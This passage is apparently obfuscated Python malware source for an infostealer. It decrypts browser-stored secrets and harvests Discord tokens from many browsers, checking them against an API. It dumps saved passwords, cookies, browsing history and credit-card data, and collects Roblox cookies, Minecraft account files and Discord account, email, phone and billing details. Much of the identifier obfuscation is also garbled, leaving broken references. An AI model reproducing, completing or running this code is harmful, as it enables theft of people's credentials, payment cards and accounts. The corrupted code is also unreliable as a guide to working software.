            if any(IIlIIlIIIlI in llIIllIlIlII.lIIlllIlIlIIlII().lower() for IIlIIlIIIlI in IIllllIlIlIlIIII):
                try:
                    llIIllIlIlII.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
    async def IIIIIlIIlIlIl(lIIlllllllIlI):
        lIlIllIlllI = lIIlllllllIlI.IllllllI + "\\BetterDiscord\\data\\betterdiscord.asar"
        if ntpath.exists(lIlIllIlllI):
            lIllllIlIl = lIIlllllllIlI.lIIIllIIIlIllllIIll
            with open(lIlIllIlllI, 'r', encoding="cp437", errors='ignore') as llllIlIlll:
                IIIIIIlllll = llllIlIlll.read()
                lIllIIlIlllIlIIIlIlI = IIIIIIlllll.replace(lIllllIlIl, 'KSCHishere')
            with open(lIlIllIlllI, 'w', newline='', encoding="cp437", errors='ignore') as llllIlIlll:
                llllIlIlll.write(lIllIIlIlllIlIIIlIlI)
    @llIIIlIlllIlllll
    def IIlIllIIIllllIII(lIIlllllllIlI, IllIlIIIIIIlll, IIlIllIllIIlIII):
        try:
            IIllllIllIlIlIllI = IllIlIIIIIIlll[3:15]
            llIlIlIlIIlIIIllII = IllIlIIIIIIlll[15:]
            IllIlIIIIIlllllIIIlI = AES.new(IIlIllIllIIlIII, AES.MODE_GCM, IIllllIllIlIlIllI)
            IIIlllIllIlIIllll = IllIlIIIIIlllllIIIlI.decrypt(llIlIlIlIIlIIIllII)
            IIIlllIllIlIIllll = IIIlllIllIlIIllll[:-16].decode()
            return IIIlllIllIlIIllll
        except Exception:
            return "Failed to decrypt password"
    def llIlIIlIlIII(lIIlllllllIlI, lllIllIIlIlllllIIIIl):
        with open(lllIllIIlIlllllIIIIl, "r", encoding="utf-8") as llllIlIlll:
            lIlllIIlIIIIIlIII = llllIlIlll.read()
        IlllIIIIlIIIlIl = json.loads(lIlllIIlIIIIIlIII)
        IIlIllIllIIlIII = base64.b64decode(IlllIIIIlIIIlIl["os_crypt"]["encrypted_key"])
        IIlIllIllIIlIII = IIlIllIllIIlIII[5:]
        IIlIllIllIIlIII = lIIIlllllI(IIlIllIllIIlIII, None, None, None, 0)[1]
        return IIlIllIllIIlIII
    def IIIIlllIl(lIIlllllllIlI):
        IlIIlllIIIlllIllIlll = {
            'Discord': lIIlllllllIlI.IllllllI + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': lIIlllllllIlI.IllllllI + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': lIIlllllllIlI.IllllllI + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': lIIlllllllIlI.IllllllI + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': lIIlllllllIlI.IllllllI + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': lIIlllllllIlI.IllllllI + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': lIIlllllllIlI.IlIlIIllIIll + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': lIIlllllllIlI.IlIlIIllIIll + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': lIIlllllllIlI.IlIlIIllIIll + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': lIIlllllllIlI.IlIlIIllIIll + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': lIIlllllllIlI.IlIlIIllIIll + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': lIIlllllllIlI.IlIlIIllIIll + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': lIIlllllllIlI.IlIlIIllIIll + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': lIIlllllllIlI.IlIlIIllIIll + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': lIIlllllllIlI.IlIlIIllIIll + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': lIIlllllllIlI.IlIlIIllIIll + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': lIIlllllllIlI.IlIlIIllIIll + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': lIIlllllllIlI.IlIlIIllIIll + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': lIIlllllllIlI.IlIlIIllIIll + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': lIIlllllllIlI.IlIlIIllIIll + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc': lIIlllllllIlI.IlIlIIllIIll + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc1': lIIlllllllIlI.IlIlIIllIIll + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc2': lIIlllllllIlI.IlIlIIllIIll + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc3': lIIlllllllIlI.IlIlIIllIIll + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': lIIlllllllIlI.IlIlIIllIIll + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
        for lIIlllIlIlIIlII, lllIllIIlIlllllIIIIl in IlIIlllIIIlllIllIlll.items():
            if not os.lllIllIIlIlllllIIIIl.exists(lllIllIIlIlllllIIIIl):
                continue
            IlIllIIIIIlIllIIl = lIIlllIlIlIIlII.replace(" ", "").lower()
            if "cord" in lllIllIIlIlllllIIIIl:
                if os.lllIllIIlIlllllIIIIl.exists(lIIlllllllIlI.IllllllI + llllIlIlll'\\{IlIllIIIIIlIllIIIIIlIIllIlIlllIllI}\\Local State'):
                    for lIIIIIlIIlI in os.listdir(lllIllIIlIlllllIIIIl):
                        if lIIIIIlIIlI[-3:] not in ["log", "ldb"]:
                            continue
                        for lIIlIllllIlIlIl in [lIllllIlIl.strip() for lIllllIlIl in open(llllIlIlll'{plIlIlIIIlIlllIlllIIlIllIIllIlIIIIh}\\{lIIIIIlIIIIIlIIllIlIlllIllII}', errors='ignore').readlines() if lIllllIlIl.strip()]:
                            for lIIlIIlIIIIIlllI in re.findall(lIIlllllllIlI.IIlIIlIllllI, lIIlIllllIlIlIl):
                                try:
                                    lIIlIIIlIIl = lIIlllllllIlI.IIlIllIIIllllIII(base64.b64decode(lIIlIIlIIIIIlllI.split('dQw4w9WgXcQ:')[1]), lIIlllllllIlI.llIlIIlIlIII(lIIlllllllIlI.IllllllI + llllIlIlll'\\{IlIllIIIIIlIllIIIIIlIIllIlIlllIllI}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    IlIIllIll = requests.get(lIIlllllllIlI.IIlIlIIllIllIII, IlIIllIIIl={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': lIIlIIIlIIl})
                                except Exception:
                                    pass
                                if IlIIllIll.status_code == 200:
                                    lIlllIlIIIIIIlI = IlIIllIll.json()['id']
                                    if lIlllIlIIIIIIlI not in lIIlllllllIlI.lIIllIIllllll:
                                        lIIlllllllIlI.IIlIlllI.append(lIIlIIIlIIl)
                                        lIIlllllllIlI.lIIllIIllllll.append(lIlllIlIIIIIIlI)
            else:
                for lIIIIIlIIlI in os.listdir(lllIllIIlIlllllIIIIl):
                    if lIIIIIlIIlI[-3:] not in ["log", "ldb"]:
                        continue
                    for lIIlIllllIlIlIl in [lIllllIlIl.strip() for lIllllIlIl in open(llllIlIlll'{plIlIlIIIlIlllIlllIIlIllIIllIlIIIIh}\\{lIIIIIlIIIIIlIIllIlIlllIllII}', errors='ignore').readlines() if lIllllIlIl.strip()]:
                        for lIIlIIIlIIl in re.findall(lIIlllllllIlI.IllIIIllIlIl, lIIlIllllIlIlIl):
                            try:
                                IlIIllIll = requests.get(lIIlllllllIlI.IIlIlIIllIllIII, IlIIllIIIl={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': lIIlIIIlIIl})
                            except Exception:
                                pass
                            if IlIIllIll.status_code == 200:
                                lIlllIlIIIIIIlI = IlIIllIll.json()['id']
                                if lIlllIlIIIIIIlI not in lIIlllllllIlI.lIIllIIllllll:
                                    lIIlllllllIlI.IIlIlllI.append(lIIlIIIlIIl)
                                    lIIlllllllIlI.lIIllIIllllll.append(lIlllIlIIIIIIlI)
        if os.lllIllIIlIlllllIIIIl.exists(lIIlllllllIlI.IllllllI + "\\Mozilla\\Firefox\\Profiles"):
            for lllIllIIlIlllllIIIIl, IIllIIllllIlIIlIl, IIllllIlllIlIlIIl in os.walk(lIIlllllllIlI.IllllllI + "\\Mozilla\\Firefox\\Profiles"):
                for IllIlIIl in IIllllIlllIlIlIIl:
                    if not IllIlIIl.endswith('.sqlite'):
                        continue
                    for lIIlIllllIlIlIl in [lIllllIlIl.strip() for lIllllIlIl in open(llllIlIlll'{plIlIlIIIlIlllIlllIIlIllIIllIlIIIIh}\\{IIllIIllllIlIIlIllIIIIlllIIIIlIIllIlIlllIllI}', errors='ignore').readlines() if lIllllIlIl.strip()]:
                        for lIIlIIIlIIl in re.findall(lIIlllllllIlI.IllIIIllIlIl, lIIlIllllIlIlIl):
                            try:
                                IlIIllIll = requests.get(lIIlllllllIlI.IIlIlIIllIllIII, IlIIllIIIl={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': lIIlIIIlIIl})
                            except Exception:
                                pass
                            if IlIIllIll.status_code == 200:
                                lIlllIlIIIIIIlI = IlIIllIll.json()['id']
                                if lIlllIlIIIIIIlI not in lIIlllllllIlI.lIIllIIllllll:
                                    lIIlllllllIlI.IIlIlllI.append(lIIlIIIlIIl)
                                    lIIlllllllIlI.lIIllIIllllll.append(lIlllIlIIIIIIlI)
    def llIIlllIIIlllIIlIlll(lIIlllllllIlI, IlIlIIIllIIllIl: str or os.PathLike = gettempdir()):
        lIIIIIlIIlI = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for IIllIIllllIlIIlIl in range(random.randint(10, 20)))
        lllIllIIlIlllllIIIIl = os.lllIllIIlIlllllIIIIl.join(IlIlIIIllIIllIl, lIIIIIlIIlI)
        open(lllIllIIlIlllllIIIIl, "x")
        return lllIllIIlIlllllIIIIl
    @llIIIlIlllIlllll
    def IIllllllIIllIl(lIIlllllllIlI, lIIlllIlIlIIlII: str, lllIllIIlIlllllIIIIl: str, IlllIIlllIllllIIII: str):
        lllIllIIlIlllllIIIIl += '\\' + IlllIIlllIllllIIII + '\\Login Data'
        if not os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl):
            return
        IlIlIIlIIlllI = lIIlllllllIlI.llIIlllIIIlllIIlIlll()
        copy2(lllIllIIlIlllllIIIIl, IlIlIIlIIlllI)
        IlIIIlIII = sqlite3.connect(IlIlIIlIIlllI)
        IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
        with open(os.lllIllIIlIlllllIIIIl.join(lIIlllllllIlI.IllllIlIllIllIIlll, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as llllIlIlll:
            for IIllIllIllllIllIlI in IlIIIlIIIlll.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                lIIlllllIIIlIlIIlIl, IIIlllIIlIlIIllllIIl, IIllIIIIlIIl = IIllIllIllllIllIlI
                IIllIIIIlIIl = lIIlllllllIlI.lIIIIIllIl(IIllIIIIlIIl, lIIlllllllIlI.IIIlIlIIIl)
                if lIIlllllIIIlIlIIlIl != "":
                    llllIlIlll.write(llllIlIlll"URL: {uIlIIllIlll}\nID: {IIIlllIIlIlIIllllIIl}\nPASSW0RD: {IIllIIIIlIIIIIlIIllIlIlllIllI}\n\n")
        IlIIIlIIIlll.close()
        IlIIIlIII.close()
        os.remove(IlIlIIlIIlllI)
    @llIIIlIlllIlllll
    def lIlllIIlIl(lIIlllllllIlI, lIIlllIlIlIIlII: str, lllIllIIlIlllllIIIIl: str, IlllIIlllIllllIIII: str):
        lllIllIIlIlllllIIIIl += '\\' + IlllIIlllIllllIIII + '\\Network\\Cookies'
        if not os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl):
            return
        IlllIllIlIIIllIlI = lIIlllllllIlI.llIIlllIIIlllIIlIlll()
        copy2(lllIllIIlIlllllIIIIl, IlllIllIlIIIllIlI)
        IlIIIlIII = sqlite3.connect(IlllIllIlIIIllIlI)
        IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
        with open(os.lllIllIIlIlllllIIIIl.join(lIIlllllllIlI.IllllIlIllIllIIlll, "Browsers", "All Cookies.txt"), 'a', encoding="utf-8") as llllIlIlll:
            for IIllIllIllllIllIlI in IlIIIlIIIlll.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                IlllllllIIlIII, lIIlllIlIlIIlII, lllIllIIlIlllllIIIIl, lIIlllIIIlIIIIIllll, IlIIIIIIIIllIl = IIllIllIllllIllIlI
                IlIlIIIII = lIIlllllllIlI.lIIIIIllIl(lIIlllIIIlIIIIIllll, lIIlllllllIlI.IIIlIlIIIl)
                if IlllllllIIlIII and lIIlllIlIlIIlII and IlIlIIIII != "":
                    llllIlIlll.write("{}\t{}\t{}\t{}\t{}\t{}\lIllIIllIIIIlIIllIlIlllIllIIIII{}\n".format(
                        IlllllllIIlIII, 'FALSE' if IlIIIIIIIIllIl == 0 else 'TRUE', lllIllIIlIlllllIIIIl, 'FALSE' if IlllllllIIlIII.startswith('.') else 'TRUE', IlIIIIIIIIllIl, lIIlllIlIlIIlII, IlIlIIIII))
        IlIIIlIIIlll.close()
        IlIIIlIII.close()
        os.remove(IlllIllIlIIIllIlI)
    @llIIIlIlllIlllll
    def IlIlllIllllIllIIlIlI(lIIlllllllIlI):
        llllIlIlll = open(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
        for lllllIllllI in os.listdir(lIIlllllllIlI.lIllllIIlIlIl):
            if re.match(lIIlllllllIlI.llIIIIIlIIlll, lllllIllllI):
                IlllIlIllIl = ntpath.join(lIIlllllllIlI.lIllllIIlIlIl, lllllIllllI, 'Login Data')
                IIlIIIlIlIIlIIlIlI = lIIlllllllIlI.IlIlIllIIIlllIllllI()
                shutil.copy2(IlllIlIllIl, IIlIIIlIlIIlIIlIlI)
                IlIIIlIII = sqlite3.connect(IIlIIIlIlIIlIIlIlI)
                IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
                IlIIIlIIIlll.execute("SELECT action_url, username_value, password_value FROM logins")
                for IlIIllIll in IlIIIlIIIlll.fetchall():
                    lIIlllllIIIlIlIIlIl = IlIIllIll[0]
                    IIIlllIIlIlIIllllIIl = IlIIllIll[1]
                    IIIlIIIIIlllIlI = IlIIllIll[2]
                    IlIlIlllIlllIIllI = lIIlllllllIlI.lIIIIIllIl(IIIlIIIIIlllIlI, lIIlllllllIlI.IllIIIIIIIIIIlllIII)
                    if lIIlllllIIIlIlIIlIl != "":
                        llllIlIlll.write(llllIlIlll"URL: {lIIlllllIIIlIlIIlIl}\nID: {IIIlllIIlIlIIllllIIl}\nPASSW0RD: {IIIlllIllIlIIllllwoIlIIllIlIIIlIIllIlIlllIllId}\n\n")
                IlIIIlIIIlll.close()
                IlIIIlIII.close()
                os.remove(IIlIIIlIlIIlIIlIlI)
        llllIlIlll.close()
    @llIIIlIlllIlllll
    def lIIlllIlllIll(lIIlllllllIlI):
        llllIlIlll = open(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
        for lllllIllllI in os.listdir(lIIlllllllIlI.lIllllIIlIlIl):
            if re.match(lIIlllllllIlI.llIIIIIlIIlll, lllllIllllI):
                IlllIlIllIl = ntpath.join(lIIlllllllIlI.lIllllIIlIlIl, lllllIllllI, 'Network', 'cookies')
                IIlIIIlIlIIlIIlIlI = lIIlllllllIlI.IlIlIllIIIlllIllllI()
                shutil.copy2(IlllIlIllIl, IIlIIIlIlIIlIIlIlI)
                IlIIIlIII = sqlite3.connect(IIlIIIlIlIIlIIlIlI)
                IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
                IlIIIlIIIlll.execute("SELECT host_key, name, encrypted_value from cookies")
                for IlIIllIll in IlIIIlIIIlll.fetchall():
                    IIIlIIllI = IlIIllIll[0]
                    IlIlIIIlIll = IlIIllIll[1]
                    lIIlIIII = lIIlllllllIlI.lIIIIIllIl(IlIIllIll[2], lIIlllllllIlI.IllIIIIIIIIIIlllIII)
                    if IIIlIIllI != "":
                        llllIlIlll.write(llllIlIlll"{IIIlIIllI}	TRUE"+"		"+ f"/FALSE	2597573456	{IlIlIIIlIll}	{lIIlIIII}\n")
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in lIIlIIII:
                        lIIlllllllIlI.IIIIlIIIII.append(lIIlIIII)
                IlIIIlIIIlll.close()
                IlIIIlIII.close()
                os.remove(IIlIIIlIlIIlIIlIlI)
        llllIlIlll.close()
    def lIIIlIIIllIllIlIl(lIIlllllllIlI, lIIlllIlIlIIlII: str, lllIllIIlIlllllIIIIl: str, IlllIIlllIllllIIII: str):
        lllIllIIlIlllllIIIIl += '\\' + IlllIIlllIllllIIII + '\\History'
        if not os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl):
            return
        lIIIIIIlIlIlIIII = lIIlllllllIlI.llIIlllIIIlllIIlIlll()
        copy2(lllIllIIlIlllllIIIIl, lIIIIIIlIlIlIIII)
        IlIIIlIII = sqlite3.connect(lIIIIIIlIlIlIIII)
        IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
        with open(os.lllIllIIlIlllllIIIIl.join(lIIlllllllIlI.IllllIlIllIllIIlll, "Browsers", "All History.txt"), 'a', encoding="utf-8") as llllIlIlll:
            lIlIlIll = []
            for IIllIllIllllIllIlI in IlIIIlIIIlll.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                lIIlllllIIIlIlIIlIl, lIIlIlIIIIIIllI, IIllIllIIIIIlll, lIlIIIlIlIIIlIIIIlll = IIllIllIllllIllIlI
                if lIIlllllIIIlIlIIlIl and lIIlIlIIIIIIllI and IIllIllIIIIIlll and lIlIIIlIlIIIlIIIIlll != "":
                    lIlIlIll.append((lIIlllllIIIlIlIIlIl, lIIlIlIIIIIIllI, IIllIllIIIIIlll, lIlIIIlIlIIIlIIIIlll))
            lIlIlIll.sort(key=lambda lIllllIlIl: lIllllIlIl[3], reverse=True)
            for llIllIlIlI in lIlIlIll:
                llllIlIlll.write("Visit Count: {:<6} TlIlIllllIllIlIIllIIlIllIIllIlIIIIllllllIIIlIIllIlIlllIllIII: {:<40}\n".format(llIllIlIlI[2], llIllIlIlI[1]))
        IlIIIlIIIlll.close()
        IlIIIlIII.close()
        os.remove(lIIIIIIlIlIlIIII)
    def llIIIIIlIlIlIIIllIl(lIIlllllllIlI, lIIlllIlIlIIlII: str, lllIllIIlIlllllIIIIl: str, IlllIIlllIllllIIII: str):
        lllIllIIlIlllllIIIIl += '\\' + IlllIIlllIllllIIII + '\\Web Data'
        if not os.lllIllIIlIlllllIIIIl.isfile(lllIllIIlIlllllIIIIl):
            return
        IllIIlllIllIIlII = lIIlllllllIlI.llIIlllIIIlllIIlIlll()
        copy2(lllIllIIlIlllllIIIIl, IllIIlllIllIIlII)
        IlIIIlIII = sqlite3.connect(IllIIlllIllIIlII)
        IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
        with open(os.lllIllIIlIlllllIIIIl.join(lIIlllllllIlI.IllllIlIllIllIIlll, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as llllIlIlll:
            for IIllIllIllllIllIlI in IlIIIlIIIlll.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                llIIlIlIllIlll, llIlIllllIlIIllllII, IIlIIIlllIIIlll, IlIIlllIlllllIlI = IIllIllIllllIllIlI
                if llIIlIlIllIlll and IlIIlllIlllllIlI != "":
                    llllIlIlll.write(
                        llllIlIlll"Name: {llIIlIlIllIlll}   Expiration Month: {llIlIllllIlIIllllII}   Expiration Year: {elIllllIlIlpillIIIIIIIlIItlIlIllllIllIlIIllIIon_year}   Card Number: {selllllIlIlll.lIIIIIllIl(card_numlllllIllIIIlerIIllIIllllIlIIlIlenlIlllIIlIIIIIlIIIrypted, lIIlllllllIlI.mlIlIlIIIlIlllIlllIIslIllIIllIlIIIIeIlIIllIllkllllllIIlIIlIIlIIIIIllIIIlIIllIlIlllIllII)}\n")
        llllIlIlll.close()
        IlIIIlIIIlll.close()
        IlIIIlIII.close()
        os.remove(IllIIlllIllIIlII)
    @llIIIlIlllIlllll
    def lIllIIlIIlIlIIllI(lIIlllllllIlI):
        llllIlIlll = open(ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')
        def lIllIlllIIlllll(lIIIIIIllIIlllllIIIl):
            lIllIlII = ""
            lIIIIIIllIIlllllIIIl.execute('SELECT title, url, last_visit_time FROM urls')
            for lllIIIIlIllIIl in lIIIIIIllIIlllllIIIl.fetchall():
                lIllIlII += llllIlIlll"Search Title: {lllIIIIlIllIIl[0]}\nURL: {lIlIllllIllIlIIllIIlIllIIllIlIIIIlllllIIIlIIllIlIlllIllIIIm[1]}\nLAST VISIT TIME: {self.cnverttim(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
            return lIllIlII
        def IIIIlIllIlllllIlI(lIIIIIIllIIlllllIIIl):
            lIIIIIIllIIlllllIIIl.execute('SELECT term FROM keyword_search_terms')
            IllIllllIIIIIlIl = ""
            for lllIIIIlIllIIl in lIIIIIIllIIlllllIIIl.fetchall():
                if lllIIIIlIllIIl[0] != "":
                    IllIllllIIIIIlIl += llllIlIlll"{lIlIllllIllIlIIllIIlIllIIllIlIIIIlllllIIIlIIllIlIlllIllIIIm[0]}\n"
            return IllIllllIIIIIlIl
        for lllllIllllI in os.listdir(lIIlllllllIlI.lIllllIIlIlIl):
            if re.match(lIIlllllllIlI.llIIIIIlIIlll, lllllIllllI):
                IlllIlIllIl = ntpath.join(lIIlllllllIlI.lIllllIIlIlIl, lllllIllllI, 'History')
                IIlIIIlIlIIlIIlIlI = lIIlllllllIlI.IlIlIllIIIlllIllllI()
                shutil.copy2(IlllIlIllIl, IIlIIIlIlIIlIIlIlI)
                IlIIIlIII = sqlite3.connect(IIlIIIlIlIIlIIlIlI)
                IlIIIlIIIlll = IlIIIlIII.IlIIIlIIIlll()
                lllIIllll = IIIIlIllIlllllIlI(IlIIIlIIIlll)
                llIlIllllllIIll = lIllIlllIIlllll(IlIIIlIIIlll)
                llllIlIlll.write(llllIlIlll"{' '*17}SEARCH\n{'-'*50}\n{sllllllIIlIlIlIIIlIlllIlllIIrlIlllIIlIIIIIlIIIhIIllIIllllIlIIlIlhlIlIllllIllIlIIllIIslIllIIllIlIIIIoIlIIllIlllIIlIIlIIIIIllIIIlIIllIlIlllIllII}\n{' '*17}\n\nLinks History\n{'-'*50}\n{wllllllIIlllllIllIIIlIIllIIllllIlIIlIlhlIlIllllIllIlIIllIIslIllIIllIlIIIIoIlIIllIlllIIlIIlIIIIIllIIIlIIllIlIlllIllII}")
                IlIIIlIIIlll.close()
                IlIIIlIII.close()
                os.remove(IIlIIIlIlIIlIIlIlI)
        llllIlIlll.close()
    def IIIIllIll(lIIlllllllIlI):
        llllIlIlll = open(lIIlllllllIlI.IllllIlIllIllIIlll + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')
        for lIIlIIIlIIl in lIIlllllllIlI.IIlIlllI:
            IIllllll = httpx.get(lIIlllllllIlI.lIIlIlIIllllIIIlI, IlIIllIIIl=lIIlllllllIlI.IIlIIIlIlIIIIIll(lIIlIIIlIIl)).json()
            IlIlIIIlIll = IIllllll.get('username') + '#' + str(IIllllll.get("discriminator"))
            IllIllIlIIl = ""
            IllIllIlIlIIlIlI = IIllllll['flags']
            if (IllIllIlIlIIlIlI == 1):
                IllIllIlIIl += "Staff, "
            if (IllIllIlIlIIlIlI == 2):
                IllIllIlIIl += "Partner, "
            if (IllIllIlIlIIlIlI == 4):
                IllIllIlIIl += "Hypesquad Event, "
            if (IllIllIlIlIIlIlI == 8):
                IllIllIlIIl += "Green Bughunter, "
            if (IllIllIlIlIIlIlI == 64):
                IllIllIlIIl += "Hypesquad Bravery, "
            if (IllIllIlIlIIlIlI == 128):
                IllIllIlIIl += "HypeSquad Brillance, "
            if (IllIllIlIlIIlIlI == 256):
                IllIllIlIIl += "HypeSquad Balance, "
            if (IllIllIlIlIIlIlI == 512):
                IllIllIlIIl += "Early Supporter, "
            if (IllIllIlIlIIlIlI == 16384):
                IllIllIlIIl += "Gold BugHunter, "
            if (IllIllIlIlIIlIlI == 131072):
                IllIllIlIIl += "Verified Bot Developer, "
            if (IllIllIlIlIIlIlI == 4194304):
                IllIllIlIIl += "Active Developer, "
            if (IllIllIlIIl == ""):
                IllIllIlIIl = "None"
            llIllIlllIIllIIll = IIllllll.get("email")
            IlIIIlIIlllIlll = IIllllll.get("phone") if IIllllll.get("phone") else "No Phone Number attached"
            IIlllIIllIIIIllIIll = httpx.get(lIIlllllllIlI.lIIlIlIIllllIIIlI + '/billing/subscriptions', IlIIllIIIl=lIIlllllllIlI.IIlIIIlIlIIIIIll(lIIlIIIlIIl)).json()
            IlIIllIIlllIIlIII = False
            IlIIllIIlllIIlIII = bool(len(IIlllIIllIIIIllIIll) > 0)
            IlIIIIllllIIIllllIl = bool(len(json.loads(httpx.get(lIIlllllllIlI.lIIlIlIIllllIIIlI + "/billing/payment-sources", IlIIllIIIl=lIIlllllllIlI.IIlIIIlIlIIIIIll(lIIlIIIlIIl)).text)) > 0)
            llllIlIlll.write(llllIlIlll"{' '*17}{usllllllIIIlIIllIlIIIlIIllIlIlllIllI}\n{'-'*50}\nBilling?: {IlIIIIllllIIIllllIl}\nNitIlIIllIllo: {IlIIllIIlllIIlIII}\nBadges: {lllllIllIIIladges}\nPhone: {IlIIIlIIlllIlll}\nToken: {lIllIIllIlIIIIokllllllIIn}\nEmlIlIlIIIlIlllIlllIIlIlIllllIllIlIIllIIl: {llIllIlllIIllIIlIIIlIIllIlIlllIllI}\n\n")
        llllIlIlll.close()
    def lIIIlIllIIllllIIllI(lIIlllllllIlI):
        IIllIIIllIlIlI = ntpath.join(lIIlllllllIlI.IllllIlIllIllIIlll, 'Minecraft')
        os.makedirs(IIllIIIllIlIlI, exist_ok=True)
        IIIlllIIlIlllIlllII = ntpath.join(lIIlllllllIlI.IllllllI, '.minecraft')
        IlIlllIllIlIIlIIIII = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
        for IllIlIIl in IlIlllIllIlIIlIIIII:
            if ntpath.exists(ntpath.join(IIIlllIIlIlllIlllII, IllIlIIl)):
                shutil.copy2(ntpath.join(IIIlllIIlIlllIlllII, IllIlIIl), IIllIIIllIlIlI + lIIlllllllIlI.IIlllIIIlIlI + IllIlIIl)
    def IIlllIIlIIIII(lIIlllllllIlI):
        def IlIlIIllllIIIlllII(lllIllIIlIlllllIIIIl):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {plIlIlIIIlIlllIlllIIlIllIIllIIIIlIIllIlIlllIllIIIIIh}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        lIIlIIIlII = IlIlIIllllIIIlllII(IlIIllIll'HKLM')
        if not lIIlIIIlII:
            lIIlIIIlII = IlIlIIllllIIIlllII(IlIIllIll'HKCU')
        if lIIlIIIlII:
            lIIlllllllIlI.IIIIlIIIII.append(lIIlIIIlII)
        if lIIlllllllIlI.IIIIlIIIII:
            with open(lIIlllllllIlI.IllllIlIllIllIIlll + "\\Roblox_Cookies.txt", "w") as llllIlIlll:
                for lIlIllllIllIlIIllII in lIIlllllllIlI.IIIIlIIIII:
